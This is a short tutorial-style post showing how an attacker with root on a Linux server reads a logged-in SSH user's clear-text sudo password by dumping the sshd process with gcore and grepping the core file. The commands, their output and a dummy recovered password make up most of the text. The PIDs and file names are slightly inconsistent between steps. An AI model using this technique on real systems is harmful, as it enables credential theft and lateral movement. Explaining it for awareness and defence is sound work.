---
description: Once you have root on a server the game is over.
---

# Getting passwords of logged in users

The hardest part of hacking a system is the external perimeter, once you break that down and manage to gain access to a internal system, the game is pretty much over. All you then need to do is escalate your priveleges to root.

## an Attacker can read clear text passwords of other users.

You may think this is not possible, but it is quite easy to read passwords of users that are logged in. especially if they are logged in via SSH.

Let me guide you through such an attack which you could call moving laterally. I have access to one syste, but can I gain access to another.

**Scenario Setup:**

* a Guild has 5 servers running their operations and 4 employees that have access to those servers.
* Each employee gains access to all servers using their password and private keys.
* A hacker manages to exploit a hole in the organisations webserver and escalates their priveleges to root.
* Later that day an Employee called Andre logs into the organisation webserver.
* Andre performs some actions which require sudo.

In this example we phave created a dummy user called **Andre** with password `Loop19278fhtht`

Even though the attacker has root, he can't read Andre's password from /etc/passwd as this is all encrypted.

### Let me introduce you to Gcore.

> A _core file_ or _core dump_ is a file that records the memory image of a running process and its process status.

**There are the steps an attacker can take to see Andre's password in clear text.**

1. He installs gdb \(which contais the gcore utility\)
2. Looks for SSH processes using ps.

```bash
charles@instance-1:/etc$ ps -ef | grep ssh
root      1655     1  0 May29 ?        00:00:09 /usr/sbin/sshd -D
root     26334  1655  0 20:17 ?        00:00:00 sshd: charles [priv]
charles  26370 26334  0 20:17 ?        00:00:00 sshd: charles@pts/0
root     29467  1655  0 21:06 ?        00:00:00 sshd: Andre [priv]
Andre    29503 29467  0 21:06 ?        00:00:00 sshd: Andre@pts/1
charles  29551 26371  0 21:07 pts/0    00:00:00 grep --color=auto ssh
```

3. Attacker identifies user Andre is logged on with PID 29503 and runs gcore.

```bash
charles@instance-1:/etc$ sudo gcore 29467
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
0x00007fb85ba4d7f0 in __poll_nocancel () at ../sysdeps/unix/syscall-template.S:84
84      ../sysdeps/unix/syscall-template.S: No such file or directory.
Saved corefile core.29467
```

4. Read the core dump using strings and passing grep to look for the SUDO command. _\(strings pulls out clear text from binary files\). **Important tool for a hacker**_

```bash
strings core.29503  | grep sudo -A 4 -B 6
136 packages can be updated.
4 updates are security updates.
New release '18.04.4 LTS' available.
Run 'do-release-upgrade' to upgrade to it.
*** System restart required ***
Last login: Fri Jul 17 21:01:33 2020 from 94.2.33.22
$ sudo ls
[sudo] password for Andre: 
obal address wou
ecdsa-sha2-nistp256-cert-v01@openssh.com,ecdsa-sha2-nistp384-cert-v01@openssh.com,ecdsa-sha2-nistp521-cert-v01@openssh.com,ssh-ed25519-cert-v01@openssh.com,ssh-rsa-cert-v01@openssh.com,ecdsa-sha2-nistp256,ecdsa-sha2-nistp384,ecdsa-sha2-nistp521,ssh-ed25519,rsa-sha2-512,rsa-sha2-256,ssh-rsa
3484 
Andre
--
pam_deny.so
/home/Andre
%bw+s
94.2.33.22
SSH-2.0-libssh2_1.9.0_DEV
94.2.33.22
sudo ls
Loop19278fhtht
e@libssh2.org
xterm
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8
```

And as you can see the password is listed in the core dump on line 22 right after the command `sudo ls`

## So what is the main take away here.

The main take away from this exercise is to show you how easy it is for an attacker to move laterally once he has a foot in the door. He can do so by not just gainng access to your other servers, but also very easily start harvesting the credentials of other users.

And now that he has access to the Andre's password he can sudo into Andre's account and look at all his previous bash history too. 

So make sure your systems are secure, because once they are in, its GAME OVER.



